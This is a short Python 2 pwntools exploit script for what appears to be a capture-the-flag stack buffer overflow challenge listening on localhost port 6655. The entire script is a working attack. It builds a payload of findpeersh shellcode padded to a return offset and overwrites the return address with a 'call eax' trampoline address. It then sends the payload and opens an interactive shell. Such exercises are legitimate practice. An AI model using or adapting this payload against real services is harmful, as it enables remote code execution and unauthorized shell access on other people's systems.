#!/usr/bin/env python2

from pwn import *

context(arch = 'i386', os = 'linux')

RET_OFFSET = 0x88 + 4
CALL_EAX_INSTRUCTION_LOCATION = 0x080486e6
SHELLCODE = asm(shellcraft.findpeersh())
PAYLOAD=flat(SHELLCODE, "A" * (RET_OFFSET - len(SHELLCODE)), CALL_EAX_INSTRUCTION_LOCATION)

r = remote("localhost", 6655)
r.recvline("Hello and welcome to this small trampolining challenge.")
r.recvline("byte stack buffer.")
r.send(PAYLOAD)
r.interactive()
